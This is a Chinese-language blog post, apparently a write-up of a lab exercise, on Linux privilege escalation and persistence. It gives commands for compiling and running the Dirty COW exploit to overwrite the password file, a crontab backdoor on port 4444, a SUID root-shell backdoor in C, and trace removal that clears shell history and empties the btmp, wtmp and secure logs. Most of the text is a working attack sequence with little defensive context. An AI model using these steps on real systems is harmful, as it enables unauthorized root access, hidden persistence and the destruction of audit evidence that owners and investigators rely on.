## **linux提权和后门植入**

  

### 1\. 脏牛漏洞复现

(1) 去网页上把dirty.c中的代码复下来，制然后touch(创建)一个.c文件，vi或者vim打开将代码复制进去保存

(不能在kali上直接wget下载https://github.com/FireFart/dirtycow/blob/master/dirty.c，因为这样会把整个网页下载下来（亲测）)

[![wps42](https://image.3001.net/images/20201116/1605507134.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111040272-240112975.jpg)

[![wps43](https://image.3001.net/images/20201116/1605507134.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111041025-148564856.jpg)

(2) 进入shell然后从kali开的apache服务上下载

[![wps44](https://image.3001.net/images/20201116/1605507135.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111041830-2084289791.jpg)

(3) 编译1.c文件

[![wps45](https://image.3001.net/images/20201116/1605507135.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111042497-1121170891.jpg)

gcc -pthread 1.c -o dirty -lcrypt 编译.c文件  
  
---  
  
  

(4) 执行文件

[![wps46](https://image.3001.net/images/20201116/1605507136.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111043067-141582096.jpg)

[![wps47](https://image.3001.net/images/20201116/1605507136.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111043705-1926251142.jpg)

./dirty | ./dirty 自定义密码

测试完记得将备份的password.bak(原)覆盖过去  
  
---  
  
  

(5) 切换改写过后的管理员账户（成功提权）

[![wps48](https://image.3001.net/images/20201116/1605507137.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111044376-1499097131.jpg)

  

### 2\. crontab计划任务

(1) vim /etc/crontab进入编辑（前提是有管理员权限）

[![wps49](https://image.3001.net/images/20201116/1605507138.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111044921-1424190045.jpg)

(2) 重启后4444端口在运行

(3) 可以控制

[![wps51](https://image.3001.net/images/20201116/1605507138.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111046087-1004848565.jpg)

  

### 3\. suid提权（前提成功提权过一次，相当于留提权留后门）

(1) 创建一个suid.c的文件（由于靶机太难编辑了，所以我kali编辑完后用wget下载过去）

[![wps52](https://image.3001.net/images/20201116/1605507139.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111046816-701406020.jpg)

[![wps53](https://image.3001.net/images/20201116/1605507140.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111047540-626261138.jpg)

#include<stdlib.h> main(){setuid(0);system(“/bin/bash”);}  
  
---  
  
  

(2) 用wget下载suid

(3) gcc编译suid.c文件

[![wps55](https://image.3001.net/images/20201116/1605507141.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111048879-1591839187.jpg)

gcc suid.c -o suid  
  
---  
  
  

(4) 修改suid的权限（将文件赋予执行该文件的以管理员身份执行改文件）

(5) 重启后的靶机可以直接执行./suid进行提权（不需要密码）

[![wps57](https://image.3001.net/images/20201116/1605507142.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111050235-2120023950.jpg)

  

  

### 4\. linux痕迹清除

(1) 仅清理当前用户： history -c

[![wps59](https://image.3001.net/images/20201116/1605507142.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111051733-113790911.jpg)

(2) 使系统不再保存命令记录：vi /etc/profile，找到HISTSIZE这个值，修改为0

[![wps60](https://image.3001.net/images/20201116/1605507143.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111052293-462550866.jpg)

删除记录

(3) 删除登录失败记录：echo > /var/log/btmp

(4) 删除登录成功记录：echo > /var/log/wtmp （此时执行last命令就会发现没有记录）

[![wps61](https://image.3001.net/images/20201116/1605507144.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111111052889-566643045.jpg)

(5) 删除日志记录：echo > /var/log/secure

